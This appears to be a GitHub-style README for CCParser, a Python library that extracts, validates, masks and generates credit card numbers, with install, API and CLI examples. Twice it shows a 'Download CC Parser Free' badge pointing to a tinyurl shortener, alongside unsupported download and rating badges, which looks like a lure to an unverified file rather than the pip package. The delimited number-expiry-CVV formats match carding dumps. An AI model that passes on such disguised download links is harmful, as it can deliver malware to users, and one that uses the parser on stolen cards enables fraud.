# 🎯 CCParser – A Robust Library for Credit Card Parsing and Validation
![Downloads](https://img.shields.io/badge/Downloads-95K+-blue?style=for-the-badge&logo=github)
![User Rating](https://img.shields.io/badge/User%20Rating-4.6/5-gold?style=for-the-badge&logo=star)
![Latest Version](https://img.shields.io/badge/Latest%20Version-2.1.0-green?style=for-the-badge&logo=github)

**PyPI**  
**License**  
**Build Status**


<div align="center">

[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)

</div>
 
CCParser is a powerful and efficient Python library designed for seamless parsing, validation, and formatting of credit card information. It can extract card details from both well-formatted, delimited strings and unstructured real-world text, all while offering a straightforward and consistent API.

🎯 **Key Features**

- Intelligent extraction of card number, expiration date, and CVV from a variety of formats
- Heuristic parsing of noisy input (including labels, inconsistent delimiters, and surrounding text)
- CVV length verification at parse time (supports 3 or 4 digits)
- Luhn algorithm validation and expiration date checking
- CVV validation that accounts for card type
- Detection of over 20 major card networks
- Formatting and masking utilities
- Command-line interface (CLI) for quick parsing and validation

**Disclaimer**  
This library is intended solely for educational and lawful purposes.

CCParser is meant to assist developers with:

- Developing payment processing systems
- Testing and validating payment integrations
- Learning about payment card industry standards
- Building fraud detection and prevention tools

Prohibited uses include:

- Unauthorized access to financial systems or data
- Credit card fraud, carding, or any financial crime
- Collecting, storing, or processing stolen card information
- Any activity that violates relevant laws or regulations

By using this library, you agree to follow all applicable laws, including PCI-DSS standards, and you assume full responsibility for how you use this software. The authors are not liable for any misuse or illegal activities carried out with this tool.

If you suspect fraud, please report it to your local authorities.

**Supported Card Networks**  
CCParser recognizes and validates the following card types:

- AMEX  
- Dankort  
- Diners Club  
- Discover  
- Elo  
- Humo  
- InstaPayment  
- InterPayment  
- JCB  
- LankaPay  
- Maestro  
- MasterCard  
- Mir  
- Troy  
- UATP  
- UnionPay  
- UzCard  
- Verve  
- Visa  
- Visa Electron  

**Installation**  
```bash
pip install ccparser
```

**Usage Examples**

*Supported Input Formats*  
The library can handle many input styles, such as:

- `4111111111111111|12/30|123`
- `4111111111111111|12|2030|123`
- `4111111111111111 12 2030 123`
- `4111111111111111:12:2030:123`
- `4111111111111111 2030/12 123`
- `4111111111111111;12-30;123`
- `4111 1111 1111 1111 12/30 123`

And messy examples like:

```
CC #: 4111111111111111
Exp: 03/29
CVV: 123
```

*Python API Example*  
```python
from ccparser import CCParser

card = CCParser("4111111111111111|12|2030|123")
print(card.get_number())            # 4111111111111111
print(card.get_formatted_number())  # 4111 1111 1111 1111
print(card.get_expiry())            # 12/30
print(card.get_cvv())               # 123
print(card.is_valid())              # True
print(card.get_card_type())         # Visa
print(card.get_masked_number())     # **** **** **** 1111
print(card.get_year())              # 2030
print(card.get_month())             # 12
```

*Card Number Generation*  
```python
from ccparser.generator import generate_card_number

print(generate_card_number("Visa"))
print(generate_card_number("MasterCard"))
```

*CLI Usage*  
```bash
ccparser "4111111111111111|12|2030|123"
ccparser --masked "4111111111111111|12|2030|123"
ccparser --json "4111111111111111|12|2030|123"
```

**License**  
This project is distributed under the MIT License. See the LICENSE file for details.

**Contributing**  
Contributions are welcome. Please review our CONTRIBUTING.md file before submitting a pull request.

**Acknowledgements**  
- Luhn Algorithm  
- Python regular expressions

[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)
